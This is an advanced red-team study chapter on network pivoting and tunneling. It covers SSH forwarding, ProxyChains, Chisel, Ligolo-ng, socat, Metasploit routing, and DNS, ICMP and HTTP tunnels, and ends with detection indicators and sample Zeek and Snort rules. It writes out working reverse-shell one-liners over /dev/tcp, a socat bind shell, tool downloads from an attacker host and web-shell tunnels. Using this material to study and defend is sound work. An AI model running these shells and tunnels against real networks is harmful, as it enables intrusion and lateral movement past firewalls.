# Tunneling & Pivoting: The Art of Movement

---
title: "Tunneling & Pivoting: The Art of Movement"
parent: "[[02_Networking]]"
tags:
  - network
  - pivoting
  - ssh
  - tunneling
  - red-team
  - lateral-movement
created: 2026-01-22
updated: 2026-01-24
difficulty: "Advanced"
---

> **Executive Summary**: You have compromised a Web Server. It has two network cards: one facing the Internet (Public), one facing the Database (Private). You cannot route directly to the Database. **Pivoting** is the art of using the Web Server as a bridge to attack the Database. **Tunneling** is encapsulation to bypass firewalls. This chapter teaches you to navigate complex network topologies like a ghost.

---

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [Core Concepts & Terminology](#2-core-concepts--terminology)
3. [Network Topology Scenarios](#3-network-topology-scenarios)
4. [SSH Tunneling Mastery](#4-ssh-tunneling-mastery)
5. [ProxyChains Configuration](#5-proxychains-configuration)
6. [Chisel - Modern Tunneling](#6-chisel---modern-tunneling)
7. [Ligolo-ng - TUN Interface Pivoting](#7-ligolo-ng---tun-interface-pivoting)
8. [Socat - Port Forwarding](#8-socat---port-forwarding)
9. [Metasploit Pivoting](#9-metasploit-pivoting)
10. [DNS Tunneling](#10-dns-tunneling)
11. [ICMP Tunneling](#11-icmp-tunneling)
12. [HTTP/HTTPS Tunneling](#12-httphttps-tunneling)
13. [VPN and Layer 2 Pivoting](#13-vpn-and-layer-2-pivoting)
14. [Double & Triple Pivoting](#14-double--triple-pivoting)
15. [Defense & Detection](#15-defense--detection)
16. [Practical Labs](#16-practical-labs)
17. [Critical Analysis & Checkpoints](#17-critical-analysis--checkpoints)

---

## 1. Learning Objectives

By the end of this chapter, you will be able to:

- **SSH Port Forwarding**: Master local (`-L`), remote (`-R`), and dynamic (`-D`) forwarding.
- **ProxyChains**: Route tools (Nmap, Metasploit, curl) through SOCKS proxies.
- **Advanced Tools**: Deploy Chisel, Ligolo-ng, and Socat for complex environments.
- **UDP Tunneling**: Bypass TCP-only restrictions.
- **Multi-Hop Pivoting**: Chain multiple pivot points together.
- **Protocol Tunneling**: Use DNS, ICMP, and HTTP for covert channels.
- **Detect Tunnels**: Identify tunneling activity as a defender.
- **Automate Pivoting**: Script tunnel setup and teardown.

---

## 2. Core Concepts & Terminology

**BEGINNER EXPLANATION**: Think of pivoting like sneaking into a building. You can't enter through the front door (firewall), so you climb in through a window (compromised server), then use the hallways inside to reach locked rooms (internal servers).

### 2.1 Key Definitions

**Pivoting**:
- Using a compromised system to attack other systems it can reach
- The compromised system becomes a "pivot point" or "jump box"
- Allows access to network segments you can't directly reach

**Tunneling**:
- Encapsulating one protocol inside another
- Example: HTTP inside DNS, or SSH inside HTTP
- Bypasses firewall rules that only check outer protocol

**Port Forwarding**:
- Redirecting traffic from one port to another
- Can be on same host or across network
- Three types: Local, Remote, Dynamic

**SOCKS Proxy**:
- Protocol for routing TCP connections through a proxy server
- SOCKS4: Supports TCP only
- SOCKS5: Supports TCP, UDP, and authentication

### 2.2 The Standard Scenario

```
┌────────────────────────────────────────────────────────────┐
│  INTERNET                                                  │
│                                                            │
│  ┌─────────────┐                                          │
│  │   Attacker  │                                          │
│  │ 10.10.14.5  │                                          │
│  └──────┬──────┘                                          │
│         │                                                  │
│         │ SSH/HTTP (allowed)                              │
│         │                                                  │
│         ▼                                                  │
└─────────┼──────────────────────────────────────────────────┘
          │                                                  
┌─────────┼──────────────────────────────────────────────────┐
│ DMZ     │                                                  │
│         ▼                                                  │
│  ┌──────────────┐                                         │
│  │  Web Server  │ eth0: 10.10.10.10 (Public)              │
│  │ (Compromised)│ eth1: 192.168.1.5 (Internal)            │
│  └──────┬───────┘                                         │
│         │                                                  │
│         │ Internal network (no route from Internet)       │
│         │                                                  │
└─────────┼──────────────────────────────────────────────────┘
          │                                                  
┌─────────┼──────────────────────────────────────────────────┐
│ INTERNAL│                                                  │
│         ▼                                                  │
│  ┌──────────────┐    ┌──────────────┐    ┌─────────────┐ │
│  │  Database    │    │ File Server  │    │ Domain      │ │
│  │192.168.1.50  │    │192.168.1.60  │    │ Controller  │ │
│  │              │    │              │    │192.168.1.10 │ │
│  └──────────────┘    └──────────────┘    └─────────────┘ │
│                                                            │
│  (Cannot be reached directly from Attacker)                │
└────────────────────────────────────────────────────────────┘
```

**Challenge**: Access 192.168.1.50 from 10.10.14.5 when there's no direct route.

**Solution**: Use Web Server (10.10.10.10 / 192.168.1.5) as a pivot.

### 2.3 Types of Tunnels

```
┌─────────────────────┬──────────────────────────────────────┐
│   Tunnel Type       │         Use Case                     │
├─────────────────────┼──────────────────────────────────────┤
│ Local Port Forward  │ Access internal service from attacker│
│ Remote Port Forward │ Receive reverse shell through pivot  │
│ Dynamic Port Forward│ SOCKS proxy for flexible routing    │
│ VPN (TUN/TAP)       │ Full network layer access            │
│ DNS Tunnel          │ Exfiltrate data when TCP is blocked  │
│ ICMP Tunnel         │ Communication when TCP/UDP blocked   │
│ HTTP Tunnel         │ Bypass proxies and DPI               │
└─────────────────────┴──────────────────────────────────────┘
```

---

## 3. Network Topology Scenarios

### 3.1 Flat Network (No Pivoting Needed)

```
Attacker ──→ Target (Direct access)
```

**Characteristics**:
- All systems on same network segment
- No firewalls between attacker and target
- Rare in modern environments

### 3.2 Single Pivot

```
Attacker ──→ Pivot ──→ Target
```

**Example**:
- Attacker compromises web server in DMZ
- Web server can reach internal database
- Attacker pivots through web server

### 3.3 Double Pivot

```
Attacker ──→ Pivot 1 ──→ Pivot 2 ──→ Target
```

**Example**:
- Web server in DMZ (Pivot 1)
- Application server in internal network (Pivot 2)
- Database in isolated VLAN (Target)

### 3.4 Triple Pivot (Red Team Exercise)

```
Attacker ──→ External Pivot ──→ DMZ Pivot ──→ Internal Pivot ──→ Critical Asset
```

**Complexity**: Each hop adds latency and failure points.

### 3.5 Mesh Topology

```
        ┌─────────────┐
        │  Attacker   │
        └──────┬──────┘
               │
      ┌────────┴────────┐
      ▼                 ▼
┌──────────┐      ┌──────────┐
│ Pivot A  │──────│ Pivot B  │
└────┬─────┘      └─────┬────┘
     │                  │
     └────────┬─────────┘
              ▼
        ┌──────────┐
        │  Target  │
        └──────────┘
```

**Multiple paths to target**: Redundancy and resilience.

---

## 4. SSH Tunneling Mastery

**BEGINNER EXPLANATION**: SSH tunneling is like building secret underground passages. You create encrypted tunnels through the SSH connection, and can send any traffic through them.

### 4.1 Local Port Forwarding (-L)

**Concept**: "Listen on my local port, forward to remote destination"

**Syntax**:
```bash
ssh -L [local_bind_addr:]local_port:destination_host:destination_port user@ssh_server
```

**Example 1 - Simple Forward**:
```bash
# Access internal database from attacker
ssh -L 3306:192.168.1.50:3306 user@10.10.10.10

# Now connect to localhost:3306
mysql -h 127.0.0.1 -P 3306 -u root -p
# Traffic goes: Attacker:3306 → SSH to 10.10.10.10 → 192.168.1.50:3306
```

**Example 2 - Multiple Forwards**:
```bash
ssh -L 8080:192.168.1.50:80 -L 3389:192.168.1.60:3389 user@10.10.10.10

# Now you have:
# localhost:8080 → 192.168.1.50:80 (HTTP)
# localhost:3389 → 192.168.1.60:3389 (RDP)
```

**Example 3 - Bind to Specific Interface**:
```bash
# Allow connections from any interface (not just localhost)
ssh -L 0.0.0.0:8080:192.168.1.50:80 user@10.10.10.10

# Now other machines can access your_ip:8080
```

**Diagram**:
```
Local Port Forward (-L)

┌──────────────┐          ┌──────────────┐          ┌──────────────┐
│   Attacker   │   SSH    │  Pivot (SSH  │  Direct  │    Target    │
│              │─────────→│   Server)    │─────────→│ 192.168.1.50 │
│ localhost:   │          │ 10.10.10.10  │          │    :3306     │
│    3306      │          │              │          │              │
└──────────────┘          └──────────────┘          └──────────────┘
     ▲                                                     │
     │                                                     │
     └─────────────────────────────────────────────────────┘
            MySQL client connects to localhost:3306
```

### 4.2 Remote Port Forwarding (-R)

**Concept**: "Listen on remote port, forward to my local destination"

**Use Case**: Receive reverse shells through firewall.

**Syntax**:
```bash
ssh -R [remote_bind_addr:]remote_port:destination_host:destination_port user@ssh_server
```

**Example 1 - Reverse Shell Receiver**:
```bash
# On attacker machine
ssh -R 4444:localhost:4444 user@10.10.10.10

# Now listening on 10.10.10.10:4444
# Traffic forwarded back to attacker localhost:4444

# Start listener on attacker
nc -lvnp 4444

# On target (192.168.1.50), execute reverse shell
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
# Connects to pivot:4444, which forwards to attacker:4444
```

**Example 2 - Exfiltration Channel**:
```bash
# Attacker starts web server
python3 -m http.server 8000

# Create remote forward
ssh -R 8000:localhost:8000 user@10.10.10.10

# Internal machines can now download from 10.10.10.10:8000
# wget http://10.10.10.10:8000/tools.sh
```

**Diagram**:
```
Remote Port Forward (-R)

┌──────────────┐          ┌──────────────┐          ┌──────────────┐
│   Attacker   │   SSH    │  Pivot (SSH  │          │ Internal     │
│              │◄─────────│   Server)    │◄─────────│ Target       │
│ localhost:   │          │ :4444        │ Connects │ 192.168.1.50 │
│    4444      │          │  listens     │          │              │
└──────────────┘          └──────────────┘          └──────────────┘
     │                           ▲                         │
     │                           │                         │
     └───────────────────────────┴─────────────────────────┘
        Reverse shell tunneled through SSH
```

### 4.3 Dynamic Port Forwarding (-D)

**Concept**: "Create SOCKS proxy on local port"

**Advantage**: One tunnel, route to any destination dynamically.

**Syntax**:
```bash
ssh -D [local_bind_addr:]local_port user@ssh_server
```

**Example**:
```bash
# Create SOCKS proxy on localhost:1080
ssh -D 1080 user@10.10.10.10

# Configure application to use SOCKS proxy
# Browser: Settings → Proxy → SOCKS5: localhost:1080
# ProxyChains: Edit /etc/proxychains4.conf
```

**Using with ProxyChains**:
```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080

# Route any tool through proxy
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains msfconsole
proxychains curl http://192.168.1.50
```

**Diagram**:
```
Dynamic Port Forward (-D)

┌──────────────┐          ┌──────────────┐          ┌──────────────┐
│   Attacker   │   SSH    │  Pivot (SSH  │  Dynamic │   Multiple   │
│              │─────────→│   Server)    │─────────→│   Targets    │
│  SOCKS5      │          │ 10.10.10.10  │          │ 192.168.1.*  │
│  :1080       │          │              │          │              │
└──────┬───────┘          └──────────────┘          └──────────────┘
       │
       ├─→ proxychains nmap 192.168.1.50
       ├─→ proxychains curl http://192.168.1.60
       └─→ proxychains firefox
```

### 4.4 Jump Host (-J)

**Concept**: Directly SSH through multiple hops.

**Syntax**:
```bash
ssh -J user1@pivot1,user2@pivot2 user3@final_target
```

**Example**:
```bash
# Direct SSH to internal server through two pivots
ssh -J user@10.10.10.10,user@192.168.1.5 user@192.168.100.50

# Equivalent to:
# ssh → 10.10.10.10 → 192.168.1.5 → 192.168.100.50
```

### 4.5 SSH Config for Automation

**~/.ssh/config**:
```
Host pivot
    HostName 10.10.10.10
    User admin
    IdentityFile ~/.ssh/pivot_key
    DynamicForward 1080

Host internal-db
    HostName 192.168.1.50
    User dbadmin
    ProxyJump pivot

Host internal-web
    HostName 192.168.1.60
    User webadmin
    ProxyJump pivot
```

**Usage**:
```bash
# Automatically creates SOCKS proxy
ssh pivot

# Automatically pivots through pivot host
ssh internal-db
ssh internal-web
```

### 4.6 Persistent SSH Tunnels

**AutoSSH** - Automatically restart tunnels:
```bash
# Install
apt-get install autossh

# Create persistent tunnel
autossh -M 20000 -f -N -D 1080 user@10.10.10.10

# -M 20000: Monitoring port
# -f: Background
# -N: No command execution
```

**SystemD Service**:
```ini
[Unit]
Description=SSH Tunnel to Pivot
After=network.target

[Service]
ExecStart=/usr/bin/autossh -M 20000 -N -D 1080 user@10.10.10.10
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

---

## 5. ProxyChains Configuration

**BEGINNER EXPLANATION**: ProxyChains is like a routing slip. It tells your tools "before you connect directly, send your traffic through this proxy first."

### 5.1 Configuration File

**/etc/proxychains4.conf** (or /etc/proxychains.conf):
```ini
# Dynamic chain: Only use proxies that are online
dynamic_chain

# Strict chain: All proxies must be online (default)
#strict_chain

# Random chain: Randomize proxy order
#random_chain

# Proxy DNS requests (prevents DNS leaks)
proxy_dns

# Local network bypass (access local IPs directly)
#localnet 127.0.0.0/255.0.0.0
#localnet 10.0.0.0/255.0.0.0

[ProxyList]
# SOCKS5 proxy
socks5 127.0.0.1 1080

# SOCKS4 proxy
#socks4 127.0.0.1 9050

# HTTP proxy
#http 127.0.0.1 8080

# Chain multiple proxies
#socks5 127.0.0.1 1080
#socks5 127.0.0.1 1081
#socks5 127.0.0.1 1082
```

### 5.2 Usage Examples

**Basic Usage**:
```bash
# Syntax
proxychains <command>

# Nmap (must use -sT for connect scan)
proxychains nmap -sT -Pn -p 80,443,3389 192.168.1.50

# Curl
proxychains curl http://192.168.1.50

# Metasploit
proxychains msfconsole

# SSH (nested tunneling)
proxychains ssh user@192.168.1.50
```

**Quiet Mode**:
```bash
# Suppress proxychains output
proxychains -q nmap -sT 192.168.1.50
```

### 5.3 ProxyChains Limitations

**What Works**:
- TCP connections
- HTTP/HTTPS
- Most application-layer protocols

**What Doesn't Work**:
- Raw sockets (Nmap -sS, -sU)
- ICMP (ping)
- ARP
- Most UDP (unless SOCKS5 with UDP support)

**Workarounds**:
- Use `-sT` (TCP connect scan) instead of `-sS` (SYN scan)
- Use `-Pn` (skip ping) for Nmap
- Use Ligolo-ng for ICMP/UDP support

---

## 6. Chisel - Modern Tunneling

**BEGINNER EXPLANATION**: Chisel is like a universal adapter. It can tunnel through HTTP, works on Windows/Linux/Mac, and doesn't require SSH. Perfect when you only have command execution, not SSH access.

### 6.1 Features

- Fast TCP/UDP tunnel over HTTP
- Secured via SSH protocol (no SSH server needed)
- Single binary (Golang)
- Cross-platform
- Reverse tunnels (client initiates, server receives)

### 6.2 Basic Usage - SOCKS Proxy

**Server (Attacker Machine)**:
```bash
# Download
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel

# Start server
./chisel server -p 8000 --reverse

# --reverse: Allow reverse tunnels from clients
# -p 8000: Listen on port 8000
```

**Client (Compromised Machine)**:
```bash
# Transfer chisel to compromised machine
wget http://10.10.14.5/chisel
chmod +x chisel

# Connect and create reverse SOCKS proxy
./chisel client 10.10.14.5:8000 R:socks

# R:socks = Reverse SOCKS proxy on attacker:1080
```

**Result**: SOCKS5 proxy listening on attacker machine (127.0.0.1:1080).

**Use**:
```bash
# Configure proxychains
# /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Route tools through pivot
proxychains nmap -sT 192.168.1.0/24
```

### 6.3 Port Forwarding with Chisel

**Local Port Forward**:
```bash
# Server (attacker)
./chisel server -p 8000 --reverse

# Client (pivot)
./chisel client 10.10.14.5:8000 R:3306:192.168.1.50:3306

# Result: Attacker can connect to localhost:3306
# Traffic forwarded to 192.168.1.50:3306 through pivot
```

**Multiple Forwards**:
```bash
./chisel client 10.10.14.5:8000 R:3306:192.168.1.50:3306 R:80:192.168.1.60:80 R:socks
```

### 6.4 Windows Example

**PowerShell Download**:
```powershell
# Download chisel.exe
Invoke-WebRequest -Uri http://10.10.14.5/chisel.exe -OutFile C:\Windows\Temp\chisel.exe

# Connect
C:\Windows\Temp\chisel.exe client 10.10.14.5:8000 R:socks
```

### 6.5 Authentication

**With Password**:
```bash
# Server
./chisel server -p 8000 --reverse --auth user:password

# Client
./chisel client --auth user:password 10.10.14.5:8000 R:socks
```

### 6.6 TLS Encryption

**Generate Certificate**:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

**Server with TLS**:
```bash
./chisel server -p 8000 --reverse --tls-key key.pem --tls-cert cert.pem
```

**Client**:
```bash
./chisel client --tls-skip-verify https://10.10.14.5:8000 R:socks
```

---

## 7. Ligolo-ng - TUN Interface Pivoting

**BEGINNER EXPLANATION**: Ligolo-ng creates a virtual network card on your attacker machine that represents the internal network. You can ping, traceroute, and run any tool without ProxyChains.

### 7.1 Advantages Over SOCKS

- Full layer 3 access (IP routing)
- ICMP works (ping, traceroute)
- UDP works natively
- No need for ProxyChains
- Can run Nmap -sS (SYN scan)

### 7.2 Setup

**Install**:
```bash
# Download from GitHub
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_Linux_64bit.tar.gz

tar xvf ligolo-ng_proxy_0.4.4_Linux_64bit.tar.gz
tar xvf ligolo-ng_agent_0.4.4_Linux_64bit.tar.gz
```

**Create TUN Interface** (Attacker):
```bash
# Create interface
sudo ip tuntap add user $(whoami) mode tun ligolo

# Bring it up
sudo ip link set ligolo up
```

**Start Proxy** (Attacker):
```bash
./proxy -selfcert
```

**Connect Agent** (Pivot):
```bash
./agent -connect 10.10.14.5:11601 -ignore-cert
```

### 7.3 Usage

**Inside Proxy Console**:
```
ligolo-ng » session
? Specify a session : 1 - user@compromised-host - 10.10.10.10:12345

[Agent : user@compromised-host] » ifconfig
┌─────────────────────────────────────────────────┐
│ Interface 0                                     │
├───────────────────┬─────────────────────────────┤
│ Name              │ eth1                        │
│ Hardware MAC      │ 00:50:56:aa:bb:cc           │
│ MTU               │ 1500                        │
│ Flags             │ up|broadcast|multicast      │
│ IPv4 Address      │ 192.168.1.5/24              │
└───────────────────┴─────────────────────────────┘

[Agent : user@compromised-host] » start
[INFO] Starting tunnel to user@compromised-host
```

**Add Route** (Attacker):
```bash
# Add route to internal network through TUN interface
sudo ip route add 192.168.1.0/24 dev ligolo
```

**Access Internal Network**:
```bash
# Ping works!
ping 192.168.1.50

# Traceroute works!
traceroute 192.168.1.50

# Nmap SYN scan works!
nmap -sS 192.168.1.50

# Any tool works directly
curl http://192.168.1.50
rdesktop 192.168.1.60
```

### 7.4 Port Forwarding (Listener)

**Start Listener on Agent**:
```
[Agent : user@compromised-host] » listener_add --addr 0.0.0.0:4444 --to 10.10.14.5:4444
```

**Result**: Agent listens on all interfaces port 4444, forwards to attacker port 4444.

**Use Case**: Receive reverse shells from internal network.

---

## 8. Socat - Port Forwarding

**BEGINNER EXPLANATION**: Socat is like a pipe connector. It connects two things together - networks, files, processes - and passes data between them.

### 8.1 Basic Port Forward

**TCP Forward**:
```bash
# Listen on pivot:8080, forward to target:80
socat TCP4-LISTEN:8080,fork,reuseaddr TCP4:192.168.1.50:80

# fork: Handle multiple connections
# reuseaddr: Allow rapid restart
```

**Usage**:
```bash
# From attacker
curl http://10.10.10.10:8080
# Traffic goes to 192.168.1.50:80
```

### 8.2 Encrypted Relay

**Generate Certificate**:
```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

**Encrypted Listener**:
```bash
# Listener (pivot)
socat OPENSSL-LISTEN:4443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

# Client (attacker)
socat - OPENSSL:10.10.10.10:4443,verify=0
```

### 8.3 Reverse Shell Relay

**Relay on Pivot**:
```bash
# Forward from pivot:4444 to attacker:4444
socat TCP4-LISTEN:4444,fork TCP4:10.10.14.5:4444
```

**Listener on Attacker**:
```bash
nc -lvnp 4444
```

**Reverse Shell from Target**:
```bash
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
```

**Flow**: Target → Pivot:4444 → Attacker:4444

### 8.4 UDP Relay

```bash
socat UDP4-LISTEN:53,fork UDP4:192.168.1.50:53
```

### 8.5 File Transfer

**Sender**:
```bash
socat TCP4-LISTEN:9999,fork,reuseaddr FILE:/path/to/file,rdonly
```

**Receiver**:
```bash
socat TCP4:10.10.10.10:9999 CREATE:/path/to/save/file
```

---

## 9. Metasploit Pivoting

**BEGINNER EXPLANATION**: Metasploit has built-in pivoting features. Once you get a Meterpreter shell on a pivot machine, you can route other Metasploit attacks through it.

### 9.1 Autoroute

**Add Route**:
```msf
meterpreter > run autoroute -s 192.168.1.0/24
[*] Adding route to 192.168.1.0/255.255.255.0...
[+] Route added

meterpreter > run autoroute -p
Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.1.0        255.255.255.0      Session 1
```

**Alternative Method**:
```msf
meterpreter > background
msf6 > route add 192.168.1.0 255.255.255.0 1
# Route through session 1
```

### 9.2 Using the Route

**Port Scan**:
```msf
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 80,443,3389
msf6 auxiliary(scanner/portscan/tcp) > run
```

**Exploit Through Pivot**:
```msf
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.50
msf6 exploit(windows/smb/psexec) > set SMBUser admin
msf6 exploit(windows/smb/psexec) > set SMBPass password
msf6 exploit(windows/smb/psexec) > exploit
```

### 9.3 SOCKS Proxy Module

```msf
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job

# Now configure proxychains to use 127.0.0.1:1080
# Route external tools through Meterpreter session
```

### 9.4 Portfwd (Port Forwarding)

**Local Forward**:
```msf
meterpreter > portfwd add -l 3306 -p 3306 -r 192.168.1.50
[*] Local TCP relay created: :3306 <-> 192.168.1.50:3306

# Now connect to localhost:3306 on attacker machine
```

**List Forwards**:
```msf
meterpreter > portfwd list
Active Port Forwards
====================
   Index  Local         Remote        Direction
   -----  -----         ------        ---------
   1      0.0.0.0:3306  192.168.1.50:3306  Forward
```

**Delete Forward**:
```msf
meterpreter > portfwd delete -l 3306
```

---

## 10. DNS Tunneling

**BEGINNER EXPLANATION**: DNS tunneling is like sending secret messages in the return address of letters. You encode data in DNS queries (which are usually allowed through firewalls), and receive responses through DNS answers.

### 10.1 DNSCat2

**Server (Attacker)**:
```bash
# Install
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install

# Start server
ruby dnscat2.rb example.com
```

**Client (Pivot)**:
```bash
# Download client
wget http://10.10.14.5/dnscat
chmod +x dnscat

# Connect
./dnscat --dns server=10.10.14.5,domain=example.com
```

**Create Tunnel**:
```dnscat
command (victim1) 1> listen 127.0.0.1:8080 192.168.1.50:80
Listening on 127.0.0.1:8080, sending connections to 192.168.1.50:80
```

### 10.2 Iodine

**Server**:
```bash
# Install
apt-get install iodine

# Start server
iodined -f 10.0.0.1 tunnel.example.com -P password
```

**Client**:
```bash
iodine -f -P password tunnel.example.com
```

**Result**: Creates TUN interface with IP 10.0.0.2.

### 10.3 Detection

**Indicators**:
- Long DNS subdomain names
- High volume of DNS queries to single domain
- Unusual DNS query types (TXT, NULL)
- DNS responses with high entropy data

---

## 11. ICMP Tunneling

**BEGINNER EXPLANATION**: ICMP (ping) packets can carry data. Some firewalls allow ICMP but block TCP/UDP. You can tunnel TCP connections inside ICMP packets.

### 11.1 Ptunnel

**Server (Attacker)**:
```bash
# Install
apt-get install ptunnel-ng

# Start server
ptunnel-ng -p password
```

**Client (Pivot)**:
```bash
# Create tunnel
ptunnel-ng -p password -lp 8080 -da 192.168.1.50 -dp 80 -x 10.10.14.5
```

**Usage**:
```bash
# Access localhost:8080 on pivot
curl http://localhost:8080
# Traffic tunneled via ICMP to attacker, then forwarded to target
```

### 11.2 ICMPTunnel

**Server**:
```bash
./icmptunnel -s
```

**Client**:
```bash
./icmptunnel 10.10.14.5
```

---

## 12. HTTP/HTTPS Tunneling

### 12.1 reGeorg (Web Shell Tunnel)

**Upload Web Shell** (tunnel.aspx, tunnel.php, tunnel.jsp):
```php
<?php
// tunnel.php - SOCKS proxy via web shell
// [Full code omitted for brevity, use reGeorg from GitHub]
?>
```

**Connect**:
```bash
python reGeorgSocksProxy.py -p 8080 -u http://target.com/tunnel.php
```

**Result**: SOCKS proxy on localhost:8080.

### 12.2 Neo-reGeorg

**Improved version with encryption**:
```bash
# Generate encrypted tunnel
python neoreg.py generate -k password

# Upload generated tunnel script
# Connect
python neoreg.py -k password -u http://target.com/tunnel.php
```

---

## 13. VPN and Layer 2 Pivoting

### 13.1 OpenVPN Reverse Tunnel

**Server Config** (attacker):
```
port 1194
proto tcp
dev tun
ca ca.crt
cert server.crt
key server.key
dh dh.pem
server 10.8.0.0 255.255.255.0
push "route 192.168.1.0 255.255.255.0"
```

**Client Config** (pivot):
```
client
dev tun
proto tcp
remote 10.10.14.5 1194
ca ca.crt
cert client.crt
key client.key
```

**Result**: Full VPN access to internal network.

### 13.2 SSH VPN (TUN)

**Enable IP Forwarding**:
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

**Create TUN VPN**:
```bash
ssh -w 0:0 user@10.10.10.10

# Configure interfaces on both sides
# Attacker
ip addr add 10.0.0.1/24 dev tun0
ip link set tun0 up

# Pivot
ip addr add 10.0.0.2/24 dev tun0
ip link set tun0 up
ip route add 192.168.1.0/24 dev tun0
```

---

## 14. Double & Triple Pivoting

**BEGINNER EXPLANATION**: Sometimes you need to pivot through multiple machines to reach your target - like taking multiple connecting flights to get to a remote destination.

### 14.1 Double Pivot with SSH

**Method 1 - Nested Tunnels**:
```bash
# First pivot: Create SOCKS proxy
ssh -D 1080 user1@pivot1

# Second pivot: SSH through first SOCKS proxy
proxychains ssh -D 1081 user2@pivot2

# Now use 1081 for final network access
proxychains -f /etc/proxychains_1081.conf nmap target
```

**Method 2 - Jump Hosts**:
```bash
ssh -J user1@pivot1,user2@pivot2 user3@target
```

### 14.2 Double Pivot with Chisel

**Attacker**:
```bash
./chisel server -p 8000 --reverse
```

**Pivot 1**:
```bash
./chisel client 10.10.14.5:8000 R:9000:127.0.0.1:9000
./chisel server -p 9001 --reverse
```

**Pivot 2**:
```bash
./chisel client 127.0.0.1:9000 R:10000:127.0.0.1:10000
./chisel server -p 10001 --reverse
```

**Target Network**: Access via SOCKS proxy on attacker's port.

### 14.3 Triple Pivot Diagram

```
┌─────────────┐
│  Attacker   │
│ 10.10.14.5  │
└──────┬──────┘
       │ SSH -D 1080
       ▼
┌─────────────┐
│  Pivot 1    │
│ 10.10.10.10 │
│ 172.16.1.5  │
└──────┬──────┘
       │ SSH -D 1081 (via 1080)
       ▼
┌─────────────┐
│  Pivot 2    │
│ 172.16.1.50 │
│ 192.168.1.5 │
└──────┬──────┘
       │ SSH -D 1082 (via 1081)
       ▼
┌─────────────┐
│  Pivot 3    │
│192.168.1.100│
│ 10.20.0.5   │
└──────┬──────┘
       │ Direct access
       ▼
┌─────────────┐
│   Target    │
│  10.20.0.50 │
└─────────────┘
```

---

## 15. Defense & Detection

**BEGINNER EXPLANATION**: As a defender, you need to spot when attackers are using your compromised machines as jumping points.

### 15.1 Detection Indicators

**SSH Tunneling**:
- Unusual SSH traffic volume (GBs instead of KB)
- Outbound SSH connections from servers
- `-D`, `-L`, `-R` flags in process arguments
- SSH connections with no PTY allocation

**DNS Tunneling**:
- Long subdomain names (>50 characters)
- High volume of queries to single domain
- Unusual query types (TXT, NULL)
- Uncommon record responses

**ICMP Tunneling**:
- Large ICMP packets (>64 bytes)
- High ICMP traffic volume
- Regular ICMP patterns

**Generic**:
- Unusual network connections from servers
- Processes listening on unexpected ports
- High bandwidth usage
- Connections to known tunnel ports (Chisel default: 8000)

### 15.2 Network Monitoring

**Zeek/Bro Detection**:
```zeek
# Detect SSH tunneling
event ssh_capabilities(c: connection, cookie: string, capabilities: string_vec) {
    if ("compress" in capabilities || "zlib" in capabilities) {
        if (c$id$resp_p == 22/tcp && c$orig$num_bytes > 1000000) {
            print fmt("Possible SSH tunnel: %s -> %s", c$id$orig_h, c$id$resp_h);
        }
    }
}
```

**Snort Rule**:
```
alert tcp any any -> any any (
    msg:"Possible DNS Tunneling";
    content:"|01 00 00 01|";
    dsize:>100;
    sid:1000001;
)
```

### 15.3 Host-Based Detection

**Monitor Process Arguments**:
```bash
# Detect SSH tunneling flags
ps aux | grep -E 'ssh.*-[LRD]'
```

**Monitor Network Connections**:
```bash
# Unusual listening ports
netstat -tunlp | grep LISTEN

# Outbound connections from www-data
lsof -u www-data -i
```

### 15.4 Prevention

**Network Segmentation**:
- Servers shouldn't initiate outbound connections
- Whitelist egress (specific IPs/ports only)

**Application Whitelisting**:
- Prevent execution of unauthorized binaries (chisel, socat)

**TLS Inspection**:
- Decrypt and inspect TLS traffic
- Detect SSH within HTTP

**Behavioral Analysis**:
- Alert on abnormal traffic patterns
- Machine learning for anomaly detection

---

## 16. Practical Labs

### Lab 1: SSH Dynamic Port Forward

**Objective**: Access internal web server through compromised DMZ server.

**Scenario**:
- Compromised DMZ server: 10.10.10.10 (SSH access)
- Internal web server: 192.168.1.50:80 (no direct route)

**Steps**:
```bash
# 1. Create dynamic tunnel
ssh -D 9050 user@10.10.10.10 -fN

# 2. Configure proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf

# 3. Access internal web server
proxychains curl http://192.168.1.50

# 4. Scan internal network
proxychains nmap -sT -Pn 192.168.1.0/24
```

### Lab 2: Chisel Reverse SOCKS

**Objective**: Pivot without SSH access.

**Scenario**:
- Compromised server: 10.10.10.10 (command execution only)
- Internal database: 192.168.1.50:3306

**Steps**:
```bash
# 1. Start chisel server on attacker
./chisel server -p 8000 --reverse

# 2. Transfer chisel to target
python3 -m http.server 80
# On target: wget http://10.10.14.5/chisel

# 3. Connect from target
./chisel client 10.10.14.5:8000 R:socks

# 4. Access database
proxychains mysql -h 192.168.1.50 -u root -p
```

